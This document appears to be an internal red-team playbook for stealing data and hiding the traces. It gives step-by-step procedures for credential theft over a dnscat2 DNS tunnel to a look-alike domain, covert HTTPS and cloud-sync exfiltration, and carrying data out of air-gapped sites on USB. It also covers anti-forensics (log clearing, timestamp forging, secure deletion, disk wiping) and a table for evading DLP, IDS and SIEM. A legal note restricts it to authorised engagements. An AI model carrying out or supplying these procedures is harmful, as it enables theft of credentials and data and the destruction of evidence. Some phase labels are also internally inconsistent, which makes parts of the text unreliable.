# GHOST-HUNT // EXFILTRATION & OBFUSCATION PLAYBOOK

> **Version:** 2.2  
> **Classification:** INTERNAL / OPERATIONAL  
> **Framework:** GHOST-HUNT // x0rTr0n  
> **Author:** Red Team  
> **Status:** ACTIVE  
> **Focus:** Data Exfiltration & Obfuscation Operations

---

## 1. FRAMEWORK IDENTITY

> *"The best exfiltration is the one the target never discovers. Structure your operation, obfuscate your trail, execute your objective."*

| Principle | Meaning | Result |
|---|---|---|
| **Modular** | Each playbook stands alone | No cross-referencing mid-operation |
| **Tactical** | Action-first, not explanation-first | Zero hesitation |
| **Structured** | Tables > paragraphs | Scannable under pressure |
| **Stealthy** | Undetectability is success | No detection signatures |

---

## 2. EXFILTRATION CLASSIFICATION MATRIX

### 2.1 Data Sensitivity Levels

| Sensitivity | Code | Definition | Exfil Priority | Obfuscation Required |
|---|---|---|---|---|
| **Critical** | `SEN-0` | Credentials, API keys, private keys, master passwords | **Immediate** | Maximum — AES-256 + Fragmentation + Decoy |
| **High** | `SEN-1` | PII, financial data, trade secrets, source code | **High** | Strong — Encryption + Traffic Mimicry |
| **Medium** | `SEN-2` | Internal documents, configurations, architecture diagrams | **Medium** | Standard — Encryption + Metadata Stripping |
| **Low** | `SEN-3` | Public-facing data, marketing materials, documentation | **Low** | Minimal — Basic obfuscation |

### 2.2 Sensitivity Decision Tree

| Condition | Threshold | Sensitivity |
|---|---|---|
| Contains admin credentials | Any | `SEN-0` |
| Contains API keys / tokens | Any | `SEN-0` |
| Contains private keys / certificates | Any | `SEN-0` |
| Contains user PII (>1000 records) | >1000 | `SEN-0` |
| Contains source code / algorithms | Any | `SEN-1` |
| Contains financial data | >$100K exposure | `SEN-1` |
| Contains internal architecture docs | Any | `SEN-2` |
| Contains configuration files | Any | `SEN-2` |
| Contains public marketing materials | Any | `SEN-3` |

*Note: When in doubt, classify up. Higher sensitivity = stronger obfuscation.*

### 2.3 Exfiltration Scenario Types

| Scenario | Code | Primary Vector | Default Obfuscation |
|---|---|---|---|
| **Credential Harvest** | `EX-CRED` | DNS Tunneling | AES-256 + Fragmentation |
| **Data Siphon** | `EX-SIPHON` | HTTPS Covert | Encryption + Chunking |
| **Continuous Exfil** | `EX-CONT` | Cloud Sync | Encryption + Metadata Stripping |
| **Air-Gap Bridge** | `EX-AIRGAP` | Physical Media | Full Disk Encryption + Steganography |
| **Covert Channel** | `EX-COVERT` | Protocol Abuse | Encryption + Traffic Mimicry |
| **Staged Extraction** | `EX-STAGE` | Multi-vector | Layered obfuscation per stage |

---

## 3. TEAM ROLES & COORDINATION

### 3.1 Red Team Structure

| Role | `ROLE_ID` | Responsibilities | Availability |
|---|---|---|---|
| **Operations Lead** | `OL` | Coordinates exfil; selects vectors; manages risk | **Always** |
| **Technical Operator** | `TO` | Executes exfil; configures tools; handles infrastructure | **Always** |
| **Obfuscation Specialist** | `OS` | Applies encryption, mimicry, anti-forensics | **Always** |
| **Recon Analyst** | `RA` | Identifies targets, maps controls, assesses detection | **Phase I** |
| **Infrastructure** | `INFRA` | Sets up C2, exfil servers, DNS infrastructure | **Pre-operation** |

### 3.2 RACI (Per-Operation)

| Task | `OL` | `TO` | `OS` | `RA` | `INFRA` |
|---|---|---|---|---|---|
| Identify exfil targets | I | I | I | **A/R** | I |
| Select exfil vector | **A** | **R** | C | C | I |
| Configure infrastructure | C | I | I | I | **A/R** |
| Execute exfiltration | **A** | **R** | C | I | I |
| Apply obfuscation | C | **R** | **A** | I | I |
| Clear traces | I | **R** | **A** | I | I |
| Post-operation review | **A/R** | C | C | C | C |

*Key: **R**=Responsible (does the work), **A**=Accountable (approves — exactly one per task), **C**=Consulted, **I**=Informed*

---

## 4. THE OPERATIONAL LIFECYCLE

```
[PREP] → [RECON] → [EXFIL] → [COVER] → [VERIFY] → [DEBRIEF]
```

| Phase | Objective | Key Output | Max Duration |
|---|---|---|---|
| **0 — Preparation** | Infrastructure, tools, credentials ready | Pre-staged exfil kit | N/A (continuous) |
| **I — Reconnaissance** | Identify targets, vectors, controls | Target assessment | 2-8 hours |
| **II — Exfiltration** | Extract data via selected vector | Data captured | Varies by data size |
| **III — Cover** | Obfuscate traces, deploy anti-forensics | Clean operational trail | 1-4 hours |
| **IV — Verify** | Confirm exfil success, check for detection | Success confirmation | 30 min |
| **V — Debrief** | Document operation, update techniques | After-action report | 1-2 days |

*Note: Phase V is mandatory. Every operation gets a debrief.*

---

## 5. EXFILTRATION PLAYBOOKS

### 5.1 `EX-CRED` — Credential Harvest

### [OP-ID: EX-CRED-OP]

**Objective:** Extract credential databases, API keys, and authentication tokens via DNS tunneling with full obfuscation.

| Asset | Status | Action |
|---|---|---|
| Target credential store | `IDENTIFIED` | Map location, size, format |
| DNS infrastructure | `READY` | Deploy dnscat2 / DNS cat server |
| Encryption layer | `CONFIGURED` | AES-256-GCM key generated |
| Detection controls | `ASSESSED` | DNS logging, IDS rules mapped |

1. **Phase I — Recon**
   - Identify credential store: LDAP, AD, KeePass, HashiCorp Vault, cloud IAM
   - Assess size and format (plaintext, hashed, encrypted)
   - Map DNS infrastructure: internal resolvers, DNS logging, passive DNS sensors
   - Select exfil subdomain (legitimate-looking: `updates.example.com`)

2. **Phase II — Exfiltration**
   - Generate dnscat2 session: `dnscat2-server --domain=updates.example.com`
   - On target: `dnscat2 updates.example.com` (or covert delivery)
   - Chunk credentials into DNS-safe payloads (≤255 chars per query)
   - Encrypt chunks with AES-256-GCM before encoding
   - Transfer with timing jitter (random 2-10 second delays)

3. **Phase III — Cover**
   - Remove dnscat2 binaries and config from target
   - Clear PowerShell/bash history
   - Rotate DNS query logs (if accessible)
   - Deploy decoy DNS queries to legitimate domains
   - Wipe temporary files with secure delete (`shred -vfz`)

4. **Phase IV — Verify**
   - Confirm all chunks received and reassembled
   - Decrypt and validate credential integrity
   - Check for detection alerts (DNS anomaly, IDS alerts)
   - Verify no operational artifacts remain

> `[EXFIL_METHOD]: DNS` | `[OBFUSCATION]: AES-256 + Fragmentation` | `[DETECTION_RISK]: LOW` | `[PHASE]: I`

---

### 5.2 `EX-SIPHON` — Data Siphon (Document Exfiltration)

### [OP-ID: EX-SIPHON-OP]

**Objective:** Extract documents, source code, and intellectual property via HTTPS covert channel with encryption and chunking.

| Asset | Status | Action |
|---|---|---|
| Target files | `IDENTIFIED` | Map file shares, repositories |
| HTTPS covert channel | `READY` | Set up C2/exfil server |
| Chunking engine | `CONFIGURED` | Split files for transfer |
| TLS certificate | `VALID` | Legitimate-looking cert |

1. **Phase I — Recon**
   - Identify file locations: SMB shares, Git repos, cloud storage, local drives
   - Catalog target files by type and size
   - Map egress controls: firewall rules, proxy logs, DLP
   - Set up exfil server with valid TLS cert (`acme-corp.com`)

2. **Phase II — Exfiltration**
   - Collect target files to staging directory
   - Compress and encrypt: `7z a -p -mhe=on -t7z archive.7z ./target/`
   - Chunk encrypted archive into 1MB segments
   - Transfer via HTTPS POST to exfil server (mimics normal web traffic)
   - Use HTTP/2 or WebSocket for flow control
   - Randomize chunk order during transfer

3. **Phase III — Cover**
   - Remove staging directory and chunks
   - Clear file access timestamps (`touch -r` with reference file)
   - Delete exfil server logs (or rotate)
   - Plant decoy files in original location (fake data)
   - Wipe memory of exfil process

4. **Phase IV — Verify**
   - Reassemble chunks on exfil server
   - Decrypt and validate file integrity (checksums)
   - Confirm no proxy/firewall alerts triggered
   - Verify decoy files are in place

> `[EXFIL_METHOD]: HTTPS` | `[OBFUSCATION]: AES-256 + Chunking + Timestamp Manipulation` | `[DETECTION_RISK]: MEDIUM` | `[PHASE]: I`

---

### 5.3 `EX-CONT` — Continuous Exfiltration (Cloud Sync Abuse)

### [OP-ID: EX-CONT-OP]

**Objective:** Establish persistent data exfiltration via authorized cloud sync services (OneDrive, Dropbox, GDrive) with minimal detection.

| Asset | Status | Action |
|---|---|---|
| Cloud sync client | `INSTALLED` | Authorized tool, blends with environment |
| Target data | `MAPPED` | Identify ongoing exfil candidates |
| Encryption | `ACTIVE` | Client-side encryption before sync |
| Sync schedule | `CONFIGURED` | Low-frequency, business-hours timing |

1. **Phase I — Recon**
   - Identify authorized cloud sync services in environment
   - Assess sync client behavior: frequency, volume, logging
   - Map data classification policies (what can sync?)
   - Select exfil account (compromised or rogue)

2. **Phase II — Exfiltration**
   - Configure sync client to target sensitive directories
   - Apply client-side encryption (Cryptomator, Boxcryptor, or custom)
   - Set sync schedule to business hours (blends with normal usage)
   - Limit upload speed to match normal traffic patterns
   - Stage data in sync folder incrementally

3. **Phase III — Cover**
   - Ensure sync client appears in legitimate software inventory
   - Maintain normal sync activity patterns (don't spike)
   - Rotate sync credentials periodically
   - Monitor for DLP alerts or unusual access patterns

4. **Phase IV — Verify**
   - Confirm data appears in cloud storage
   - Validate encryption integrity
   - Check for detection: CASB alerts, DLP, proxy logs
   - Verify sync client remains in good standing

> `[EXFIL_METHOD]: CLOUD` | `[OBFUSCATION]: Client-side Encryption + Timing Mimicry` | `[DETECTION_RISK]: LOW` | `[PHASE]: I`

---

### 5.4 `EX-AIRGAP` — Air-Gap Bridge (Physical Media)

### [OP-ID: EX-AIRGAP-OP]

**Objective:** Extract data from air-gapped or high-security environments via physical media with full encryption and steganographic hiding.

| Asset | Status | Action |
|---|---|---|
| Target system | `ACCESSIBLE` | Physical or USB access confirmed |
| USB media | `PREPARED` | Encrypted, clean, innocuous appearance |
| Data target | `IDENTIFIED` | Size and sensitivity assessed |
| Exit strategy | `PLANNED` | How to leave with media |

1. **Phase I — Recon**
   - Confirm physical access to target system
   - Identify USB ports, autorun policies, endpoint controls
   - Assess data size and transfer time
   - Plan media egress route (pocket, bag, etc.)

2. **Phase II — Exfiltration**
   - Prepare encrypted USB: `cryptsetup luksFormat /dev/sdX`
   - Copy target data to encrypted volume
   - Optionally embed data in innocuous file (steganography)
   - Use `dd` or forensic tools to create disk image if needed
   - Eject media cleanly

3. **Phase III — Cover**
   - Clear USB connection logs (if accessible)
   - Remove any temporary files created during transfer
   - Wipe USB metadata (volume label, recent files)
   - If using steganography: ensure cover file looks normal

4. **Phase IV — Verify**
   - Confirm data integrity after egress
   - Validate encryption on media
   - Check for physical surveillance or detection
   - Secure storage of exfiltrated media

> `[EXFIL_METHOD]: PHYSICAL` | `[OBFUSCATION]: LUKS Encryption + Steganography` | `[DETECTION_RISK]: HIGH` | `[PHASE]: I`

---

### 5.5 `EX-COVERT` — Covert Channel (Protocol Abuse)

### [OP-ID: EX-COVERT-OP]

**Objective:** Establish covert data channel using protocol abuse (ICMP, HTTP headers, WebSocket) with traffic mimicry.

| Asset | Status | Action |
|---|---|---|
| Protocol selected | `IDENTIFIED` | ICMP / HTTP / WebSocket |
| Channel infrastructure | `READY` | Listener configured |
| Encoding scheme | `CONFIGURED` | Data embedded in protocol fields |
| Traffic profile | `MIMICKED` | Looks like legitimate traffic |

1. **Phase I — Recon**
   - Identify permitted protocols (ICMP, HTTP, WebSocket, DNS)
   - Map firewall rules and protocol inspection capabilities
   - Select protocol with least inspection depth
   - Set up covert listener on controlled infrastructure

2. **Phase II — Exfiltration**
   - Embed data in protocol fields:
     - ICMP: payload in echo request/reply
     - HTTP: custom headers, cookie values, URL parameters
     - WebSocket: binary frames with embedded data
   - Encode data (Base64, custom encoding, compression)
   - Transfer in small packets to avoid anomaly detection
   - Mimic timing of legitimate protocol usage

3. **Phase III — Cover**
   - Remove covert tools from target
   - Clear connection logs and packet captures
   - Ensure traffic volume remains within normal baselines
   - Deploy decoy legitimate traffic on same protocol

4. **Phase IV — Verify**
   - Confirm data received and decodable
   - Check for protocol anomaly alerts
   - Verify traffic patterns match legitimate baseline
   - No IDS/IPS signatures triggered

> `[EXFIL_METHOD]: PROTOCOL_ABUSE` | `[OBFUSCATION]: Traffic Mimicry + Encoding` | `[DETECTION_RISK]: MEDIUM` | `[PHASE]: I`

---

### 5.6 `EX-STAGE` — Staged Extraction (Multi-Vector)

### [OP-ID: EX-STAGE-OP]

**Objective:** Execute multi-stage exfiltration using different vectors at each stage to maximize stealth and data volume.

| Asset | Status | Action |
|---|---|---|
| Stage 1 vector | `SELECTED` | Initial access + staging |
| Stage 2 vector | `SELECTED` | Staging to intermediate |
| Stage 3 vector | `SELECTED` | Final exfil to controlled infra |
| Obfuscation layers | `STACKED` | Different per stage |

1. **Phase I — Recon**
   - Map full attack path from target to controlled infrastructure
   - Identify viable vectors at each stage
   - Assess detection capabilities at each hop
   - Plan obfuscation for each stage

2. **Phase II — Exfiltration**
   - **Stage 1:** Access target, stage data to intermediate location
     - Vector: Local access, USB, or initial foothold
     - Obfuscation: Encryption + secure delete originals
   - **Stage 2:** Move data from intermediate to staging server
     - Vector: HTTPS, DNS tunneling, or cloud sync
     - Obfuscation: Chunking + timing jitter
   - **Stage 3:** Final extraction to fully controlled infrastructure
     - Vector: Direct connection or additional hops
     - Obfuscation: Full encryption + decoy traffic

3. **Phase III — Cover**
   - Clean each hop: remove tools, clear logs, wipe traces
   - Deploy decoy activity at each stage
   - Rotate infrastructure after operation
   - Verify no forensic artifacts remain

4. **Phase IV — Verify**
   - Confirm data integrity through all stages
   - Validate encryption at final destination
   - Check for detection at each hop
   - Document operational security gaps

> `[EXFIL_METHOD]: MULTI_VECTOR` | `[OBFUSCATION]: Layered per stage` | `[DETECTION_RISK]: LOW-MEDIUM` | `[PHASE]: I`

---

## 6. OBFUSCATION TECHNIQUES

### 6.1 Encryption Methods

| Method | Use Case | Implementation | Strength |
|---|---|---|---|
| **AES-256-GCM** | General data encryption | `openssl enc -aes-256-gcm -salt -pbkdf2` | Very High |
| **ChaCha20** | High-speed encryption | `openssl enc -chacha20 -salt` | High |
| **XChaCha20** | Extended nonce scenarios | Custom implementation | Very High |
| **GPG** | File-level encryption | `gpg --symmetric --cipher-algo AES256` | High |

### 6.2 Traffic Mimicry Techniques

| Technique | Description | Application |
|---|---|---|
| **Timing Jitter** | Random delays between packets | DNS tunneling, covert channels |
| **Volume Matching** | Match normal traffic patterns | Cloud sync, HTTPS exfil |
| **Protocol Impersonation** | Mimic legitimate protocol usage | ICMP, HTTP, WebSocket |
| **Padding** | Add junk data to match expected sizes | All vectors |
| **Decoy Traffic** | Mix with legitimate requests | All vectors |

### 6.3 Anti-Forensics Methods

| Method | Purpose | Implementation |
|---|---|---|
| **Secure Deletion** | Destroy evidence beyond recovery | `shred -vfz`, `sdelete`, disk wipe |
| **Log Manipulation** | Remove operational traces | Clear/bash history, rotate logs |
| **Timestamp Manipulation** | Alter file metadata | `touch -r`, `timestomp` |
| **Memory Wiping** | Remove runtime artifacts | Process memory clearing |
| **Disk Wiping** | Destroy entire disk evidence | DBAN, `dd if=/dev/urandom` |

---

## 7. COMMUNICATION TEMPLATES

### 7.1 Operation Brief (Internal)

```
[OP-ID: <OP_ID>] // OPERATION BRIEF

Objective: <ONE_SENTENCE_DIRECTIVE>
Data Target: <TARGET_DESCRIPTION>
Sensitivity: <SEN-0|SEN-1|SEN-2|SEN-3>
Exfil Vector: <DNS|HTTPS|CLOUD|PHYSICAL|COVERT|MULTI>
Obfuscation: <METHODS>
Detection Risk: <LOW|MEDIUM|HIGH|CRITICAL>
Team: <OL>, <TO>, <OS>, <RA>
Time Window: <START> → <END>
```

### 7.2 Phase Transition Update

```markdown
### [OP-ID: <OP_ID>] — Phase <N> Complete

**Status:** <PHASE_NAME> COMPLETE

| Metric | Value |
|---|---|
| Time elapsed | `<N>m` |
| Data extracted | `<SIZE>` |
| Detection alerts | `<NONE|COUNT>` |
| Obfuscation status | `<ACTIVE|PENDING>` |
| Next phase | `<PHASE_NAME>` |

*Note: <Any operational considerations.>*

> `[EXFIL_METHOD]: <METHOD>` | `[PHASE]: <N+1>` | `[DETECTION_RISK]: <LEVEL>`
```

### 7.3 Operation Debrief

```markdown
### [OP-ID: <OP_ID>-DEBRIEF]

**Objective:** Operation completion review and technique improvement.

| Field | Value |
|---|---|
| Operation ID | `<OP_ID>` |
| Data sensitivity | `<SEN-0|SEN-1|SEN-2|SEN-3>` |
| Exfil vector | `<METHOD>` |
| Total data extracted | `<SIZE>` |
| Detection status | `<NONE|DETECTED|PARTIAL>` |
| Duration | `<START> → <END>` |

### Timeline

| Time | Event | Actor |
|---|---|---|
| `HH:MM` | Recon started | `RA` |
| `HH:MM` | Exfil commenced | `TO` |
| `HH:MM` | Cover initiated | `OS` |
| `HH:MM` | Verification complete | `OL` |

### Lessons Learned

- **What worked:** <techniques that succeeded>
- **What needs improvement:** <gaps or near-detections>
- **Technique updates:** <new methods to incorporate>

> `[EXFIL_METHOD]: <METHOD>` | `[PHASE]: V — COMPLETE` | `[DETECTION_RISK]: ASSESSED`
```

---

## 8. PRE-STAGED OPERATIONAL KIT

| Resource | Purpose | Notes |
|---|---|---|
| **DNS Infrastructure** | dnscat2 server, domains | Pre-configured, low-profile |
| **HTTPS C2 Server** | Web server with valid cert | Mimics legitimate service |
| **Cloud Accounts** | Sync targets | Encrypted, compartmentalized |
| **USB Media** | Physical exfil | LUKS encrypted, innocuous |
| **Encryption Keys** | AES-256, ChaCha20 | Generated, stored securely |
| **Tool Archive** | Exfil tools collection | Packed, obfuscated |
| **Decoy Materials** | False trails | Planted indicators |

---

## 9. TABLE-TOP EXERCISE GUIDANCE

> *"No playbook survives first contact with a real operation. Test it quarterly or it's dead paper."*

| Exercise | Frequency | Duration | Participants | Goal |
|---|---|---|---|---|
| **Walkthrough** | Quarterly | 2 hours | `OL`, `TO`, `OS` | Validate playbook flow; catch stale infrastructure |
| **Simulation** | Biannual | 4 hours | Full team | Execute playbooks in lab; test detection evasion |
| **Red Team Drill** | Annual | 8 hours | Full team + Blue Team | Full operation with blue team attempting detection |

**Scenario rotation:** Cycle through `EX-CRED` → `EX-SIPHON` → `EX-AIRGAP` → `EX-COVERT` across exercises.

**After each exercise:**

1. Capture **gaps** in playbooks (missing steps, broken infrastructure, detection failures)
2. Update playbooks within **1 week** of exercise
3. Document **lessons learned** using debrief template (Section 7.3)

---

## 10. DETECTION AVOIDANCE GUIDELINES

| Control | Evasion Technique | Implementation |
|---|---|---|
| **DNS Logging** | Low-volume queries, timing jitter | Limit queries/hour, random delays |
| **Proxy Logs** | HTTPS with valid cert, normal User-Agent | Mimic browser traffic patterns |
| **DLP Alerts** | Encryption before transfer, chunking | No plaintext in transit |
| **IDS/IPS** | Protocol compliance, traffic mimicry | Stay within RFC specs |
| **CASB** | Authorized tools, normal patterns | Use sanctioned cloud services |
| **SIEM** | Business-hours activity, low volume | Match normal user behavior |
| **Physical Security** | Authorized access, innocuous media | Badge access, clean USB |

---

## 11. LEGAL & COMPLIANCE CONSIDERATIONS

| Requirement | Consideration | Action |
|---|---|---|
| **Authorization** | Written approval required | Obtain signed ROE before any operation |
| **Scope** | Defined targets only | Never exceed authorized scope |
| **Evidence** | Preserve for potential legal use | Document chain of custody |
| **Disclosure** | Report findings to authorized parties | Follow engagement rules |
| **Data Handling** | Treat exfil'd data as sensitive | Secure storage, limited access |
| **Attribution** | Protect team identity | Compartmentalize operations |

*Note: Unauthorized exfiltration is illegal. This framework is for authorized red team operations only.*

---

## 12. APPENDIX: FIELD QUICK-REFERENCE CARD

> **Print and laminate. One per operator station.**

**OP-ID format:** `OP-YYYYMMDD-NNN` (e.g., `OP-20260803-001`)

| Sensitivity | Exfil Priority | Obfuscation Level | Cover Time |
|---|---|---|---|
| `SEN-0` | **Immediate** | Maximum | 4 hours |
| `SEN-1` | **High** | Strong | 2 hours |
| `SEN-2` | **Medium** | Standard | 1 hour |
| `SEN-3` | **Low** | Minimal | 30 min |

```
[PREP] → [RECON] → [EXFIL] → [COVER] → [VERIFY] → [DEBRIEF]
└── Phase 0 ─┘ └── Phase I ─┘ └─ Phase II ─┘ └─ Phase III ─┘ └─ Phase IV ─┘ └─ Phase V ─┘
```

**Playbook Quick-Pick:**

| Scenario | Playbook |
|---|---|
| Credentials, API keys, tokens | `EX-CRED` (Section 5.1) |
| Documents, source code, IP | `EX-SIPHON` (Section 5.2) |
| Continuous, persistent exfil | `EX-CONT` (Section 5.3) |
| Air-gapped, high-security | `EX-AIRGAP` (Section 5.4) |
| Covert channels, protocol abuse | `EX-COVERT` (Section 5.5) |
| Multi-stage, complex operations | `EX-STAGE` (Section 5.6) |

---

> **[CONCLUSION]:** The best exfiltration is the one the target never discovers. Every second spent obfuscating is a second the defender isn't detecting. Strip hesitation. Execute technique. 🚬

---

*END EXFILTRATION & OBFUSCATION PLAYBOOK*
